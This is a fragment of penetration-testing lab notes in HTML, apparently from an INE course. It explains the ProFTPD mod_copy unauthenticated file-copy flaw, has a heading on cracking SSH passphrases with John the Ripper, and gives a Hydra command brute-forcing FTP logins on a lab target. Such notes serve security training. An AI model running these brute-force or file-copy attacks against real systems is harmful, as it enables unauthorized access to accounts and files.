+</p></div><div style="display:contents" dir="auto"><ul id="29b65c01-9416-8012-9f3b-dbbec42267b0" class="bulleted-list"><li style="list-style-type:disc"><code>/T</code> —&gt;  Applies to all subfolders and files.</li></ul></div><div style="display:contents" dir="auto"><ul id="29b65c01-9416-8084-9ff4-d1f0a49994a9" class="bulleted-list"><li style="list-style-type:disc"><code>/C</code> — &gt; Continues on errors (e.g., access denied on some items).</li></ul></div><div style="display:contents" dir="auto"><ul id="29b65c01-9416-80db-93e4-ce7f5f028998" class="bulleted-list"><li style="list-style-type:disc"><code>/Q</code> — &gt; Runs quietly, suppressing success messages.</li></ul></div><div style="display:contents" dir="auto"><hr id="29b65c01-9416-8001-81de-f155809473b6"/></div><div style="display:contents" dir="auto"><p id="29b65c01-9416-80c1-b8fa-f77dcc3e4b4e" class="">The <code>mod_copy module </code>implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.</p></div><div style="display:contents" dir="auto"><hr id="29b65c01-9416-800c-a017-c4cf83e14a5c"/></div><div style="display:contents" dir="auto"><p id="29c65c01-9416-8032-a328-dcbb7bf8f635" class="">
+</p></div><div style="display:contents" dir="auto"><h1 id="29b65c01-9416-808b-af52-d5c35465b094" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">CRACKING SSH PASSPHRASE USING JOHN THE RIPPER</span></strong></em></h1></div><div style="display:contents" dir="auto"><p id="29c65c01-9416-808f-84db-f21bbe58953f" class="">
+</p></div><div style="display:contents" dir="auto"><hr id="29c65c01-9416-80e0-9b65-c7099ff6f2ef"/></div><div style="display:contents" dir="auto"><h2 id="29d65c01-9416-8031-8c76-fc3e78e8f269" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">FTP BRUTE FORCE ON UNUSUAL PORT USING HYDRA</span></strong></em></h2></div><div style="display:contents" dir="auto"><p id="29d65c01-9416-80fa-a999-d99f2fbf1431" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29d65c01-9416-808f-b288-c88f621e1f1e" class=""><code>hydra -L ftp_users.txt -P /root/Desktop/wordlists/unix_passwords.txt -s 5554 target.ine.local ftp </code></p></div><div style="display:contents" dir="auto"><hr id="29d65c01-9416-807b-8a80-c1fad2670f23"/></div><div style="display:contents" dir="auto"><p id="29d65c01-9416-8097-9879-d21152c44cbb" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
